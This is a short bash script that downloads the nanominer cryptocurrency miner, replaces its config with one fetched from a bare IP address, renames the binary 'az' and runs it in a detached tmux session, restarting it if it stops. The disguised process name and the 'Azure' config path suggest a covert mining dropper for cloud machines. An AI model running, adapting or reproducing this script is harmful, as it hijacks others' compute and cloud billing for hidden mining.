#!/bin/bash

if [ -f ${PWD}/nanominer-linux-3.1.4/az ]; then
    if pgrep -x "az" > /dev/null
then
	echo " Ok roi"
else
cd nanominer-linux-3.1.4 &&  rm config.ini && wget http://103.145.255.41:88/config.ini && tmux new-session -d -s my_session1 './az'

fi
exit
fi

wget https://github.com/nanopool/nanominer/releases/download/v3.1.4/nanominer-linux-3.1.4.tar.gz && tar xvzf nanominer-linux-3.1.4.tar.gz && cd nanominer-linux-3.1.4 && rm config.ini && wget http://103.145.255.41:88/Azure/config.ini && mv nanominer az &&  tmux new-session -d -s my_session1 './az'
